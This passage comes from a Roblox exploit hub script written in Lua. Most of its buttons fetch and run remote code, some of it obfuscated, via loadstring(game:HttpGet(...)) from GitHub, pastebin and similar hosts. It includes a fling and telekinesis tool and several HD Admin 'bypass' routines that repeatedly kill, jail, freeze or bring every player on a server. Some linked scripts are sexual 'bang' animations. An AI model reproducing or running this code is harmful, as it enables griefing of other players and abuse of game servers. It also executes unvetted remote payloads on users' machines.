        loadstring(game:HttpGet("https://raw.githubusercontent.com/cnPthPiGon/c00lgui-v3rx/refs/heads/main/Raw.lua%200X2"))()
    end    
})

Tab9:AddButton({
    Name = "Keyboard",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/GGH52lan/GGH52lan/main/keyboard.txt"))()
    end    
})

Tab9:AddButton({
    Name = "FE R6",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/v0c0n1337/scripts/refs/heads/main/R6.txt"))()
    end    
})

Tab9:AddButton({
    Name = "Tpwalk Gui",
    Callback = function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-tpwalk-script-17608"))()
    end    
})

Tab9:AddButton({
    Name = "ToolDraw",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Affexter/Programs/refs/heads/main/scripts/tooldrawFE.lua"))()
    end    
})

Tab9:AddButton({
    Name = "Fe Ilusion clone *",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/0Ben1/fe/main/obf_11l7Y131YqJjZ31QmV5L8pI23V02b3191sEg26E75472Wl78Vi8870jRv5txZyL1.lua.txt"))()
    end    
})

Tab9:AddButton({
    Name = "Fe Punch",
    Callback = function()
        loadstring(game:HttpGet(('https://raw.githubusercontent.com/0Ben1/fe/main/obf_rf6iQURzu1fqrytcnLBAvW34C9N55kS9g9G3CKz086rC47M6632sEd4ZZYB0AYgV.lua.txt'),true))()
    end    
})

Tab9:AddButton({
    Name = "AntiLag",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/cnPthPiGon/Best-Script-Server-and-client/refs/heads/main/Best-AntiLag-Max-FFlag"))()
    end    
})

Tab9:AddButton({
    Name = "Tool Control",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/v0c0n1337/scripts/refs/heads/main/FE%20Tool%20control.txt"))()
    end    
})

Tab9:AddButton({
    Name = "bring Part Fe",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/cnPthPiGon/CM9/refs/heads/main/Bring%20Part%20And%20More"))()
    end    
})

Tab9:AddButton({
    Name = "Telekinesis tool fe mobile/Pc",
    Callback = function()
        -- Press a block to pick it (ignores anchored blocks) (there is a thing called network ownership so you cannot pick it but works on games sometimes like da hood)
-- Long Press - Flings a block (power is customizable at line 19)
-- Unequip  - Releases a block

-- Create a ScreenGui to hold the GUI elements


Range = "Min" -- "Min" (idk), "Max" (lag), "Default" (fastest)

local BP = Instance.new("BodyPosition")
BP.maxForce = Vector3.new(math.huge * math.huge, math.huge * math.huge, math.huge * math.huge)
BP.P = BP.P * 1.1

local BP = Instance.new("BodyPosition")
BP.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
BP.Position = BP.Position + Vector3.new(0, 0.1, 0)

task.spawn(function()
game:GetService("RunService").RenderStepped:Connect(function()
if Range == "Max" then
sethiddenproperty(game.Players.LocalPlayer, "SimulationRadius", 0)
elseif Range == "Min" then
sethiddenproperty(game.Players.LocalPlayer, "SimulationRadius", 500)
end
end)
end)

local function a(b, c)
    local d = getfenv(c)
    local e =
        setmetatable(
        {},
        {__index = function(self, f)
                if f == "script" then
                    return b
                else
                    return d[f]
                end
            end}
    )
    setfenv(c, e)
    return c
end
local power = 1000
local usrinput = game:GetService("UserInputService")
local g = {}
local h = Instance.new("Model", game:GetService("Lighting"))
local i = Instance.new("Tool")
local j = Instance.new("Part")
local k = Instance.new("Script")
local l = Instance.new("LocalScript")
local m = sethiddenproperty or set_hidden_property
i.Name = "Telekinesis"
i.Parent = h
i.Grip = CFrame.new(0, 0, 0, 0, 1, 0, 0, 0, 1, 1, 0, 0)
i.GripForward = Vector3.new(-0, -1, -0)
i.GripRight = Vector3.new(0, 0, 1)
i.GripUp = Vector3.new(1, 0, 0)
j.Name = "Handle"
j.Parent = i
j.CFrame = CFrame.new(-17.2635937, 15.4915619, 46, 0, 1, 0, 1, 0, 0, 0, 0, -1)
j.Orientation = Vector3.new(0, 180, 90)
j.Position = Vector3.new(-17.2635937, 15.4915619, 46)
j.Rotation = Vector3.new(-180, 0, -90)
j.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
j.Transparency = 1
j.Size = Vector3.new(1, 1.20000005, 1)
j.BottomSurface = Enum.SurfaceType.Weld
j.BrickColor = BrickColor.new("Really black")
j.Material = Enum.Material.Metal
j.TopSurface = Enum.SurfaceType.Smooth
j.brickColor = BrickColor.new("Really black")
k.Name = "LineConnect"
k.Parent = i
table.insert(
    g,
    a(
        k,
        function()
            wait()
            local n = script.Part2
            local o = script.Part1.Value
            local p = script.Part2.Value
            local q = script.Par.Value
            local color = script.Color
            local r = Instance.new("Part")
            r.TopSurface = 0
            r.BottomSurface = 0
            r.Reflectance = .5
            r.Name = "Laser"
            r.Locked = true
            r.CanCollide = false
            r.Anchored = true
            r.formFactor = 0
            r.Size = Vector3.new(1, 1, 1)
            local s = Instance.new("BlockMesh")
            s.Parent = r
            while true do
                if n.Value == nil then
                    break
                end
                if o == nil or p == nil or q == nil then
                    break
                end
                if o.Parent == nil or p.Parent == nil then
                    break
                end
                if q.Parent == nil then
                    break
                end
                local t = CFrame.new(o.Position, p.Position)
                local dist = (o.Position - p.Position).magnitude
                r.Parent = q
                r.BrickColor = color.Value.BrickColor
                r.Reflectance = color.Value.Reflectance
                r.Transparency = color.Value.Transparency
                r.CFrame = CFrame.new(o.Position + t.lookVector * dist / 2)
                r.CFrame = CFrame.new(r.Position, p.Position)
                s.Scale = Vector3.new(.25, .25, dist)
                wait()
            end
            r:remove()
            script:remove()
        end
    )
)
k.Disabled = true
l.Name = "MainScript"
l.Parent = i
table.insert(
    g,
    a(
        l,
        function()
            wait()
            tool = script.Parent
            lineconnect = tool.LineConnect
            object = nil
            mousedown = false
            found = false
            BP = Instance.new("BodyPosition")
            BP.maxForce = Vector3.new(math.huge * math.huge, math.huge * math.huge, math.huge * math.huge)
            BP.P = BP.P * 2
            dist = nil
            point = Instance.new("Part")
            point.Locked = true
            point.Anchored = true
            point.formFactor = 0
            point.Shape = 0
            point.BrickColor = BrickColor.Black()
            point.Size = Vector3.new(1, 1, 1)
            point.CanCollide = false
            local s = Instance.new("SpecialMesh")
            s.MeshType = "Sphere"
            s.Scale = Vector3.new(.7, .7, .7)
            s.Parent = point
            handle = tool.Handle
            front = tool.Handle
            color = tool.Handle
            objval = nil
            local u = false
            local v = BP:clone()
            v.maxForce = Vector3.new(30000, 30000, 30000)
            function LineConnect(o, p, q)
                local w = Instance.new("ObjectValue")
                w.Value = o
                w.Name = "Part1"
                local x = Instance.new("ObjectValue")
                x.Value = p
                x.Name = "Part2"
                local y = Instance.new("ObjectValue")
                y.Value = q
                y.Name = "Par"
                local z = Instance.new("ObjectValue")
                z.Value = color
                z.Name = "Color"
                local A = lineconnect:clone()
                A.Disabled = false
                w.Parent = A
                x.Parent = A
                y.Parent = A
                z.Parent = A
                A.Parent = workspace
                if p == object then
                    objval = x
                end
            end
            function onButton1Down(B)
                if mousedown == true then
                    return
                end
                mousedown = true
                coroutine.resume(
                    coroutine.create(
                        function()
                            local C = point:clone()
                            C.Parent = tool
                            LineConnect(front, C, workspace)
                            while mousedown == true do
                                C.Parent = tool
                                if object == nil then
                                    if B.Target == nil then
                                        local t = CFrame.new(front.Position, B.Hit.p)
                                        C.CFrame = CFrame.new(front.Position + t.lookVector * 1000)
                                    else
                                        C.CFrame = CFrame.new(B.Hit.p)
                                    end
                                else
                                    LineConnect(front, object, workspace)
                                    break
                                end
                                wait()
                            end
                            C:remove()
                        end
                    )
                )
                while mousedown == true do
                    if B.Target ~= nil then
                        local D = B.Target
                        if D.Anchored == false then
                            object = D
                            dist = (object.Position - front.Position).magnitude
                            break
                        end
                    end
                    wait()
                end
                while mousedown == true do
                    if object.Parent == nil then
                        break
                    end
                    local t = CFrame.new(front.Position, B.Hit.p)
                    BP.Parent = object
                    BP.position = front.Position + t.lookVector * dist
                    wait()
                end
                BP:remove()
                object = nil
                objval.Value = nil
            end
            function onKeyDown(E, B)
                local E = E:lower()
                local F = false
                if E == "q" then
                    if dist >= 5 then
                        dist = dist - 10
                    end
                end
                if E == "r" then
                    if object == nil then
                        return
                    end
                    for G, H in pairs(object:children()) do
                        if H.className == "BodyGyro" then
                            return nil
                        end
                    end
                    BG = Instance.new("BodyGyro")
                    BG.maxTorque = Vector3.new(math.huge, math.huge, math.huge)
                    BG.cframe = CFrame.new(object.CFrame.p)
                    BG.Parent = object
                    repeat
                        wait()
                    until object.CFrame == CFrame.new(object.CFrame.p)
                    BG.Parent = nil
                    if object == nil then
                        return
                    end
                    for G, H in pairs(object:children()) do
                        if H.className == "BodyGyro" then
                            H.Parent = nil
                        end
                    end
                    object.Velocity = Vector3.new(0, 0, 0)
                    object.RotVelocity = Vector3.new(0, 0, 0)
                    object.Orientation = Vector3.new(0, 0, 0)
                end
                if E == "e" then
                    dist = dist + 10
                end
                if E == "t" then
                    if dist ~= 10 then
                        dist = 10
                    end
                end
                if E == "y" then
                    if dist ~= 200 then
                        dist = 200
                    end
                end
                if E == "=" then
                    BP.P = BP.P * 1.5
                end
                if E == "-" then
                    BP.P = BP.P * 0.5
                end
            end
            function onEquipped(B)
                touched = false
                uneq = false
                keymouse = B
                local I = tool.Parent
                human = I.Humanoid
                human.Changed:connect(
                    function()
                        if human.Health == 0 then
                            mousedown = false
                            uneq = true
                            touched = false
                            BP:remove()
                            point:remove()
                            tool:remove()
                        end
                    end
                )
                usrinput.TouchTapInWorld:connect(
                    function()
                        if uneq == false then
                        if touched == false then
                        onButton1Down(B)
                        touched = true
                        elseif touched == true then
                        touched = false
                        end
                        end
                    end
                )
                usrinput.TouchLongPress:connect(function()
                    if uneq == false then
                        if dist ~= power then
                            dist = power
                        end
                    end
                end)
                B.KeyDown:connect(
                    function(E)
                        onKeyDown(E, B)
                    end
                )
                B.Icon = "rbxasset://textures\\GunCursor.png"
            end
            tool.Equipped:connect(onEquipped)
            tool.Unequipped:connect(function() uneq = true touched = false mousedown = false end)
        end
    )
)
for J, H in pairs(h:GetChildren()) do
    H.Parent = game:GetService("Players").LocalPlayer.Backpack
    pcall(
        function()
            H:MakeJoints()
        end
    )
end
h:Destroy()
for J, H in pairs(g) do
    spawn(
        function()
            pcall(H)
        end
    )
end
    end    
})

Tab9:AddButton({
    Name = "auto wall hop",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/cnPthPiGon/CM9/refs/heads/main/Wlhop.lua"))()
    end    
})

Tab9:AddButton({
    Name = "Target Gui With Remote Event",
    Callback = function()
        loadstring(game:HttpGet("https://protected-roblox-scripts.onrender.com/b21ae403b94ba624665e25b0468030df"))()
    end    
})

Tab9:AddButton({
    Name = "Player Lock Universal",
    Callback = function()
        loadstring(game:HttpGet("https://protected-roblox-scripts.onrender.com/4b0ef829d88e76e4904fceb02f0fe030"))()
    end    
})

local Tab9 = Window:MakeTab({
    Name = "Animation Fe",
    Icon = "rbxassetid://95593705",
    PremiumOnly = false
})

Tab9:AddButton({
    Name = "Energize Gui R15",
    Callback = function()
        loadstring(game:HttpGet(('https://pastebin.com/raw/1p6xnBNf'),true))()
    end    
})

Tab9:AddButton({
    Name = "Animation R6 Gui",
    Callback = function()
        loadstring(game:HttpGet("https://gist.githubusercontent.com/MelonsStuff/f018928d2f010789a150b4924e279b16/raw/8de399eb9cbccbde430fcd37270cd4ff171f8b8e/AnimationGUI.txt"))()
    end    
})

Tab9:AddButton({
    Name = "Fe glio r6 just",
    Callback = function()
        writefile(".nonecing", "white")
loadstring(game:HttpGet(('https://glot.io/snippets/gua2ntmbdm/raw/main.lua'),true))()
    end    
})

Tab9:AddButton({
    Name = "Fe sus hub",
    Callback = function()
        local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local isR6 = character:FindFirstChild("Torso") ~= nil

-- Notification Function
local function showNotification(message)
    local notificationGui = Instance.new("ScreenGui")
    notificationGui.Name = "NotificationGui"
    notificationGui.Parent = game.CoreGui

    local notificationFrame = Instance.new("Frame")
    notificationFrame.Size = UDim2.new(0, 300, 0, 50)
    notificationFrame.Position = UDim2.new(0.5, -150, 1, -60)
    notificationFrame.AnchorPoint = Vector2.new(0.5, 1)
    notificationFrame.BackgroundColor3 = Color3.fromRGB(60, 60, 255) -- Blue color
    notificationFrame.BorderSizePixel = 0
    notificationFrame.Parent = notificationGui

    local uicorner = Instance.new("UICorner")
    uicorner.CornerRadius = UDim.new(0, 10)
    uicorner.Parent = notificationFrame

    local textLabel = Instance.new("TextLabel")
    textLabel.Size = UDim2.new(1, -20, 1, 0)
    textLabel.Position = UDim2.new(0, 10, 0, 0)
    textLabel.BackgroundTransparency = 1
    textLabel.Text = message .. " | by pyst"
    textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    textLabel.Font = Enum.Font.SourceSansBold
    textLabel.TextSize = 18
    textLabel.TextXAlignment = Enum.TextXAlignment.Left
    textLabel.Parent = notificationFrame

    notificationFrame.BackgroundTransparency = 1
    textLabel.TextTransparency = 1

    game:GetService("TweenService"):Create(
        notificationFrame,
        TweenInfo.new(0.5, Enum.EasingStyle.Quint, Enum.EasingDirection.Out),
        {BackgroundTransparency = 0}
    ):Play()

    game:GetService("TweenService"):Create(
        textLabel,
        TweenInfo.new(0.5, Enum.EasingStyle.Quint, Enum.EasingDirection.Out),
        {TextTransparency = 0}
    ):Play()

    task.delay(5, function()
        game:GetService("TweenService"):Create(
            notificationFrame,
            TweenInfo.new(0.5, Enum.EasingStyle.Quint, Enum.EasingDirection.In),
            {BackgroundTransparency = 1}
        ):Play()

        game:GetService("TweenService"):Create(
            textLabel,
            TweenInfo.new(0.5, Enum.EasingStyle.Quint, Enum.EasingDirection.In),
            {TextTransparency = 1}
        ):Play()

        task.delay(0.5, function()
            notificationGui:Destroy()
        end)
    end)
end

-- Show notification based on rig type
if isR6 then
    showNotification("🌟 R6 detected!")
else
    showNotification("✨ R15 detected!")
end

-- Create Screen GUI
local gui = Instance.new("ScreenGui")
gui.Name = "BangGui"
gui.Parent = game.CoreGui

-- Main Frame
local mainFrame = Instance.new("Frame")
mainFrame.Size = UDim2.new(0, 300, 0, 300)
mainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
mainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
mainFrame.BackgroundColor3 = Color3.fromRGB(80, 80, 255) -- Deep Blue
mainFrame.BorderSizePixel = 0
mainFrame.Parent = gui

local uicorner = Instance.new("UICorner")
uicorner.CornerRadius = UDim.new(0, 20)
uicorner.Parent = mainFrame

-- Title
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, -60, 0, 30)
title.Position = UDim2.new(0, 10, 0, 0)
title.BackgroundTransparency = 1
title.Text = "🎨 Choose a Script"
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.Font = Enum.Font.SourceSansBold
title.TextSize = 24
title.TextXAlignment = Enum.TextXAlignment.Left
title.Parent = mainFrame

-- Close Button
local closeButton = Instance.new("TextButton")
closeButton.Size = UDim2.new(0, 30, 0, 30)
closeButton.Position = UDim2.new(1, -40, 0, 0)
closeButton.BackgroundColor3 = Color3.fromRGB(255, 100, 100) -- Red
closeButton.Text = "X"
closeButton.Font = Enum.Font.SourceSansBold
closeButton.TextSize = 20
closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
closeButton.Parent = mainFrame

local closeCorner = Instance.new("UICorner")
closeCorner.CornerRadius = UDim.new(0, 10)
closeCorner.Parent = closeButton

closeButton.MouseButton1Click:Connect(function()
    gui:Destroy()
end)

-- Minimize Button
local minimizeButton = Instance.new("TextButton")
minimizeButton.Size = UDim2.new(0, 30, 0, 30)
minimizeButton.Position = UDim2.new(1, -80, 0, 0)
minimizeButton.BackgroundColor3 = Color3.fromRGB(255, 200, 0) -- Orange
minimizeButton.Text = "-"
minimizeButton.Font = Enum.Font.SourceSansBold
minimizeButton.TextSize = 20
minimizeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
minimizeButton.Parent = mainFrame

local minimizeCorner = Instance.new("UICorner")
minimizeCorner.CornerRadius = UDim.new(0, 10)
minimizeCorner.Parent = minimizeButton

local minimized = false
minimizeButton.MouseButton1Click:Connect(function()
    minimized = not minimized
    if minimized then
        mainFrame:TweenSize(UDim2.new(0, 300, 0, 30), Enum.EasingDirection.In, Enum.EasingStyle.Quint, 0.5)
    else
        mainFrame:TweenSize(UDim2.new(0, 300, 0, 300), Enum.EasingDirection.Out, Enum.EasingStyle.Quint, 0.5)
    end
end)

-- Scrolling Frame
local scrollingFrame = Instance.new("ScrollingFrame")
scrollingFrame.Size = UDim2.new(1, -20, 1, -50)
scrollingFrame.Position = UDim2.new(0, 10, 0, 40)
scrollingFrame.BackgroundTransparency = 1
scrollingFrame.CanvasSize = UDim2.new(0, 0, 0, 300)
scrollingFrame.ScrollBarThickness = 6
scrollingFrame.Parent = mainFrame

local layout = Instance.new("UIListLayout")
layout.Padding = UDim.new(0, 10)
layout.HorizontalAlignment = Enum.HorizontalAlignment.Center
layout.Parent = scrollingFrame

-- Buttons Data
local buttons = {
    {name = "🎯 Bang V2", r6 = "https://pastebin.com/raw/aPSHMV6K", r15 = "https://pastebin.com/raw/1ePMTt9n"},
    {name = "🎉 Get Banged", r6 = "https://pastebin.com/raw/zHbw7ND1", r15 = "https://pastebin.com/raw/7hvcjDnW"},
    {name = "💥 Suck", r6 = "https://pastebin.com/raw/SymCfnAW", r15 = "https://pastebin.com/raw/p8yxRfr4"},
    {name = "🔥 Get Suc", r6 = "https://pastebin.com/raw/FPu4e2Qh", r15 = "https://pastebin.com/raw/DyPP2tAF"},
    {name = "⚡ Jerk", r6 = "https://pastefy.app/wa3v2Vgm/raw", r15 = "https://pastefy.app/YZoglOyJ/raw"}
}

for _, buttonData in ipairs(buttons) do
    local button = Instance.new("TextButton")
    button.Size = UDim2.new(0.8, 0, 0, 40)
    button.BackgroundColor3 = Color3.fromRGB(math.random(100, 255), math.random(100, 255), math.random(100, 255)) -- Random colors
    button.Text = buttonData.name
    button.Font = Enum.Font.SourceSansBold
    button.TextSize = 20
    button.TextColor3 = Color3.fromRGB(255, 255, 255)
    button.Parent = scrollingFrame

    local uicorner = Instance.new("UICorner")
    uicorner.CornerRadius = UDim.new(0, 10)
    uicorner.Parent = button

    button.MouseButton1Click:Connect(function()
        if isR6 then
            loadstring(game:HttpGet(buttonData.r6))()
        else
            loadstring(game:HttpGet(buttonData.r15))()
        end
    end)
end
    end    
})

Tab9:AddButton({
    Name = "Fe Gale Fighter",
    Callback = function()
        loadstring(game:HttpGet("https://pastebin.com/raw/XPGSMEw9"))()
    end    
})

Tab9:AddButton({
    Name = "touch fling",
    Callback = function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Touch-fling-script-22447"))()
    end    
})

Tab9:AddButton({
    Name = "Fe Sad Boy",
    Callback = function()
        loadstring(game:HttpGet("https://pastebin.com/raw/hgPJbwF0"))()
    end    
})

Tab9:AddButton({
    Name = "Fe all animation gui R6*",
    Callback = function()
        loadstring(game:HttpGet("https://github.com/Sinister-Scripts/Roblox-Exploits/raw/refs/heads/main/FE-Animation-GUI-R6"))()
    end    
})

local Tab10 = Window:MakeTab({
    Name = "Gang up simulator",
    Icon = "rbxassetid://114174716101522",
    PremiumOnly = false
})

Tab10:AddButton({
    Name = "Best gui by me",
    Callback = function()
        loadstring(game:HttpGet("https://pastebin.com/raw/ndWA13K0"))()
    end    
})

local Tab11 = Window:MakeTab({
    Name = "Hd Admin Script",
    Icon = "rbxassetid://9048948650",
    PremiumOnly = false
})

Tab11:AddButton({
    Name = "Hd Admin Panel",
    Callback = function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-HD-Admin-Panel-34209"))()
    end    
})

Tab11:AddButton({
    Name = "kill all bypass method",
    Callback = function()
        local prefix = ";" -- préfixe HD Admin
local cmdName = "kill" -- commande HD Admin

-- Pour kill tout le monde
for _, player in pairs(game.Players:GetPlayers()) do
    local args = { [1] = prefix .. cmdName .. " " .. player.Name }
    game:GetService("ReplicatedStorage"):WaitForChild("HDAdminClient")
        :WaitForChild("Signals"):WaitForChild("RequestCommand"):InvokeServer(unpack(args))
    wait(0.1)
end
    end    
})

Tab11:AddButton({
    Name = "bring all bypass method",
    Callback = function()
        local prefix = ";" -- préfixe HD Admin
local cmdName = "bring" -- commande HD Admin

-- Pour kill tout le monde
for _, player in pairs(game.Players:GetPlayers()) do
    local args = { [1] = prefix .. cmdName .. " " .. player.Name }
    game:GetService("ReplicatedStorage"):WaitForChild("HDAdminClient")
        :WaitForChild("Signals"):WaitForChild("RequestCommand"):InvokeServer(unpack(args))
    wait(0.1)
end
    end    
})

Tab11:AddButton({
    Name = "freeze all bypass method",
    Callback = function()
        local prefix = ";" -- préfixe HD Admin
local cmdName = "freeze" -- commande HD Admin

-- Pour kill tout le monde
for _, player in pairs(game.Players:GetPlayers()) do
    local args = { [1] = prefix .. cmdName .. " " .. player.Name }
    game:GetService("ReplicatedStorage"):WaitForChild("HDAdminClient")
        :WaitForChild("Signals"):WaitForChild("RequestCommand"):InvokeServer(unpack(args))
    wait(0.1)
end
    end    
})

Tab11:AddButton({
    Name = "btools all bypass method",
    Callback = function()
        local prefix = ";" -- préfixe HD Admin
local cmdName = "btools" -- commande HD Admin

-- Pour kill tout le monde
for _, player in pairs(game.Players:GetPlayers()) do
    local args = { [1] = prefix .. cmdName .. " " .. player.Name }
    game:GetService("ReplicatedStorage"):WaitForChild("HDAdminClient")
        :WaitForChild("Signals"):WaitForChild("RequestCommand"):InvokeServer(unpack(args))
    wait(0.1)
end
    end    
})

Tab11:AddButton({
    Name = "invisible all bypass method",
    Callback = function()
        local prefix = ";" -- préfixe HD Admin
local cmdName = "invisible" -- commande HD Admin

-- Pour kill tout le monde
for _, player in pairs(game.Players:GetPlayers()) do
    local args = { [1] = prefix .. cmdName .. " " .. player.Name }
    game:GetService("ReplicatedStorage"):WaitForChild("HDAdminClient")
        :WaitForChild("Signals"):WaitForChild("RequestCommand"):InvokeServer(unpack(args))
    wait(0.1)
end
    end    
})

Tab11:AddButton({
    Name = "re all bypass method",
    Callback = function()
        local prefix = ";" -- préfixe HD Admin
local cmdName = "re" -- commande HD Admin

-- Pour kill tout le monde
for _, player in pairs(game.Players:GetPlayers()) do
    local args = { [1] = prefix .. cmdName .. " " .. player.Name }
    game:GetService("ReplicatedStorage"):WaitForChild("HDAdminClient")
        :WaitForChild("Signals"):WaitForChild("RequestCommand"):InvokeServer(unpack(args))
    wait(0.1)
end
    end    
})

Tab11:AddButton({
    Name = "ff all bypass method",
    Callback = function()
        local prefix = ";" -- préfixe HD Admin
local cmdName = "ff" -- commande HD Admin

-- Pour kill tout le monde
for _, player in pairs(game.Players:GetPlayers()) do
    local args = { [1] = prefix .. cmdName .. " " .. player.Name }
    game:GetService("ReplicatedStorage"):WaitForChild("HDAdminClient")
        :WaitForChild("Signals"):WaitForChild("RequestCommand"):InvokeServer(unpack(args))
    wait(0.1)
end
    end    
})

Tab11:AddButton({
    Name = "god mode all bypass method",
    Callback = function()
        local prefix = ";" -- préfixe HD Admin
local cmdName = "god" -- commande HD Admin

-- Pour kill tout le monde
for _, player in pairs(game.Players:GetPlayers()) do
    local args = { [1] = prefix .. cmdName .. " " .. player.Name }
    game:GetService("ReplicatedStorage"):WaitForChild("HDAdminClient")
        :WaitForChild("Signals"):WaitForChild("RequestCommand"):InvokeServer(unpack(args))
    wait(0.1)
end
    end    
})

Tab11:AddButton({
    Name = "god me",
    Callback = function()
        game.Players:Chat(";god me")
    end    
})

Tab11:AddButton({
    Name = "ff me",
    Callback = function()
        game.Players:Chat(";ff me")
    end    
})

Tab11:AddButton({
    Name = "btools me",
    Callback = function()
        game.Players:Chat(";btools me")
    end    
})

Tab11:AddButton({
    Name = "respawn",
    Callback = function()
        game.Players:Chat(";re")
    end    
})

Tab11:AddButton({
    Name = "invisible me",
    Callback = function()
        game.Players:Chat(";invisible me")
    end    
})

Tab11:AddButton({
    Name = "SpawnLocation",
    Callback = function()
        game.Players:Chat(";insert 53326")
    end    
})

Tab11:AddButton({
    Name = "Drooling Zombie",
    Callback = function()
        game.Players:Chat(";insert 187789986")
    end    
})

Tab11:AddButton({
    Name = "Police Car",
    Callback = function()
        game.Players:Chat(";insert 6418230807")
    end    
})

Tab11:AddButton({
    Name = "Grass Baseplate",
    Callback = function()
        game.Players:Chat(";insert 10100805")
    end    
})

Tab11:AddButton({
    Name = "Zombie Spawn",
    Callback = function()
        game.Players:Chat(";insert 93601062")
    end    
})

Tab11:AddButton({
    Name = "Sport Car",
    Callback = function()
        game.Players:Chat(";insert 6433323089")
    end    
})

Tab11:AddButton({
    Name = "Doge",
    Callback = function()
        game.Players:Chat(";insert 257489726")
    end    
})

Tab11:AddButton({
    Name = "Rocket tool",
    Callback = function()
        game.Players:Chat(";insert 47637")
    end    
})

Tab11:AddButton({
    Name = "Super Car",
    Callback = function()
        game.Players:Chat(";insert 6433330180")
    end    
})

Tab11:AddButton({
    Name = "Meteor",
    Callback = function()
        game.Players:Chat(";insert 86374494")
    end    
})

Tab11:AddButton({
    Name = "Dummy",
    Callback = function()
        game.Players:Chat(";insert 124120704")
    end    
})

Tab11:AddButton({
    Name = "Wolf",
    Callback = function()
        game.Players:Chat(";insert 1989724206")
    end    
})

Tab11:AddButton({
    Name = "Alien",
    Callback = function()
        game.Players:Chat(";insert 69489068")
    end    
})

Tab11:AddButton({
    Name = "Civil War Canon",
    Callback = function()
        game.Players:Chat(";insert 174258074")
    end    
})

Tab11:AddButton({
    Name = "Bus",
    Callback = function()
        game.Players:Chat(";insert 59524699")
    end    
})

Tab11:AddButton({
    Name = "Godzilla",
    Callback = function()
        game.Players:Chat(";insert 3127241980")
    end    
})

Tab11:AddButton({
    Name = "TransFormers optimus",
    Callback = function()
        game.Players:Chat(";insert 521792865")
    end    
})

Tab11:AddButton({
    Name = "Monster Truck RC",
    Callback = function()
        game.Players:Chat(";insert 161159912")
    end    
})

Tab11:AddButton({
    Name = "StreamPunk Train",
    Callback = function()
        game.Players:Chat(";insert 157131091")
    end    
})

Tab11:AddButton({
    Name = "Rocket",
    Callback = function()
        game.Players:Chat(";insert 31603741")
    end    
})

Tab11:AddButton({
    Name = "Gear Service",
    Callback = function()
        game.Players:Chat(";insert 1075123174")
    end    
})

Tab11:AddButton({
    Name = "jail all bypass method",
    Callback = function()
        local prefix = ";" -- préfixe HD Admin
local cmdName = "jail" -- commande HD Admin

-- Pour kill tout le monde
for _, player in pairs(game.Players:GetPlayers()) do
    local args = { [1] = prefix .. cmdName .. " " .. player.Name }
    game:GetService("ReplicatedStorage"):WaitForChild("HDAdminClient")
        :WaitForChild("Signals"):WaitForChild("RequestCommand"):InvokeServer(unpack(args))
    wait(0.1)
end
    end    
})

Tab11:AddButton({
    Name = "ice all bypass method",
    Callback = function()
        local prefix = ";" -- préfixe HD Admin
local cmdName = "ice" -- commande HD Admin

-- Pour kill tout le monde
for _, player in pairs(game.Players:GetPlayers()) do
    local args = { [1] = prefix .. cmdName .. " " .. player.Name }
    game:GetService("ReplicatedStorage"):WaitForChild("HDAdminClient")
        :WaitForChild("Signals"):WaitForChild("RequestCommand"):InvokeServer(unpack(args))
    wait(0.1)
end
    end    
})

Tab11:AddButton({
    Name = "loopkill all",
    Callback = function()
        _G.LoopKill = true -- Active le loop

spawn(function()
    while _G.LoopKill do
        for _, player in pairs(game.Players:GetPlayers()) do
            local args = { [1] = ";kill " .. player.Name }
            game:GetService("ReplicatedStorage"):WaitForChild("HDAdminClient")
                :WaitForChild("Signals"):WaitForChild("RequestCommand"):InvokeServer(unpack(args))
        end
        wait(5)
    end
end)
    end    
})

Tab11:AddButton({
    Name = "unloop kill all",
    Callback = function()
        _G.LoopKill = false
    end    
})

Tab11:AddButton({
    Name = "loop bring all",
    Callback = function()
        _G.LoopBring = true -- Active le loop

spawn(function()
    while _G.LoopBring do
        for _, player in pairs(game.Players:GetPlayers()) do
            local args = { [1] = ";bring " .. player.Name }
            game:GetService("ReplicatedStorage"):WaitForChild("HDAdminClient")
                :WaitForChild("Signals"):WaitForChild("RequestCommand"):InvokeServer(unpack(args))
        end
        wait(5)
    end
end)
    end    
})

Tab11:AddButton({
    Name = "unloop bring all",
    Callback = function()
        _G.LoopBring = false
    end    
})

Tab11:AddButton({
    Name = "loop jail all",
    Callback = function()
        _G.LoopJail = true -- Active le loop

spawn(function()
    while _G.LoopJail do
        for _, player in pairs(game.Players:GetPlayers()) do
            local args = { [1] = ";jail " .. player.Name }
            game:GetService("ReplicatedStorage"):WaitForChild("HDAdminClient")
                :WaitForChild("Signals"):WaitForChild("RequestCommand"):InvokeServer(unpack(args))
        end
        wait(7)
    end
end)
    end    
})

Tab11:AddButton({
    Name = "unloop bring all",
    Callback = function()
        _G.LoopJail = false
    end    
})

Tab11:AddButton({
    Name = "loop ice all",
    Callback = function()
        _G.LoopIce = true -- Active le loop

spawn(function()
    while _G.LoopIce do
        for _, player in pairs(game.Players:GetPlayers()) do
            local args = { [1] = ";ice " .. player.Name }
            game:GetService("ReplicatedStorage"):WaitForChild("HDAdminClient")
                :WaitForChild("Signals"):WaitForChild("RequestCommand"):InvokeServer(unpack(args))
        end
        wait(7.8)
    end
end)
    end    
})

Tab11:AddButton({
    Name = "unloop ice all",
    Callback = function()
        _G.LoopIce = false
    end    
})

Tab11:AddButton({
    Name = "loop respawn all",
    Callback = function()
        _G.LoopRespawn = true -- Active le loop

spawn(function()
    while _G.LoopRespawn do
        for _, player in pairs(game.Players:GetPlayers()) do
            local args = { [1] = ";re " .. player.Name }
